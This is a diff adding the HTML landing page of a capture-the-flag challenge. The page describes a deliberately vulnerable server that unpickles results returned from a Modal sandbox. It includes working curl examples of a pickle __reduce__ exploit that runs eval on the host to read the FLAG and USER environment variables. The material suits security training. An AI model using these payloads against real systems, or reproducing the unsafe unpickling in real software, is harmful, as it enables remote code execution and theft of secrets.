@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Modal CTF Challenge</title>
+    <style>
+        body { font-family: monospace; max-width: 1000px; margin: 50px auto; padding: 20px; }
+        h1 { color: #333; }
+        .code-block { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        .section { margin: 30px 0; }
+        .warning { color: #d9534f; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>🚩 Modal CTF Challenge - Capture the Flag! 🚩</h1>
+    
+    <div class="section">
+        <h2>Challenge Description</h2>
+        <p>Your goal is to capture the flag (stored in the FLAG environment variable on this VM) by exploiting a pickle deserialization vulnerability.</p>
+        <p>This server accepts Python code, sends it to a Modal Restricted Function for execution, and then unpickles the result.</p>
+        <p>The vulnerability occurs when the server deserializes the response from Modal - if you return an object with a malicious __reduce__ method, it will execute on this host!</p>
+        <p class="warning">⚠️ This is an intentionally vulnerable application for CTF purposes only!</p>
+    </div>
+
+    <div class="section">
+        <h2>Example: Simple Code Execution</h2>
+        <p>Try running a simple Python script to verify the code is executing remotely (should show 'root' as the user):</p>
+        <div class="code-block">
+curl -X POST [YOUR_URL]/execute \
+  -d 'import os, pwd
+username = pwd.getpwuid(os.getuid()).pw_name
+print(f"Running as: {username}")
+f"Result: 2+2={2+2}"'
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Example: Pickle Deserialization Attack</h2>
+        <p>Here's how to exploit pickle deserialization to capture the flag:</p>
+        <div class="code-block">
+curl -X POST [YOUR_URL]/execute \
+  -d 'class Exploit:
+    def __reduce__(self):
+        import os
+        return (eval, ("__import__(\"os\").environ.get(\"FLAG\", \"No flag found\")",))
+
+Exploit()'
+        </div>
+        <p>This creates a class that uses __reduce__ to execute code during pickle deserialization when Modal returns the result.</p>
+    </div>
+
+    <div class="section">
+        <h2>Example: Username Verification</h2>
+        <p>This exploit will show the username from the host system (should be different from 'root' if the exploit works):</p>
+        <div class="code-block">
+curl -X POST [YOUR_URL]/execute \
+  -d 'class UserExploit:
+    def __reduce__(self):
+        import os
+        return (eval, ("__import__(\"os\").environ.get(\"USER\", \"unknown\")",))
+
+UserExploit()'
+        </div>
+    </div>
+
+    <div class="section">
+        <h2>Rules</h2>
+        <ul>
+            <li>The flag is stored in the FLAG environment variable on the host VM</li>
+            <li>The Modal function runs with restrict_modal_access=True and block_network=True</li>
+            <li>Code executes in a Modal container, but the pickle exploit runs on the host</li>
+            <li>Be creative! There might be multiple ways to exploit the deserialization</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>API Endpoint</h2>
+        <p><strong>POST /execute</strong></p>
+        <p>Request body: Raw Python code (plain text, not JSON)</p>
+        <div class="code-block">
+curl -X POST [YOUR_URL]/execute -d 'print("Hello"); 42'
+        </div>
+        <p>Response: JSON with execution results</p>
+    </div>
+</body>
+</html>
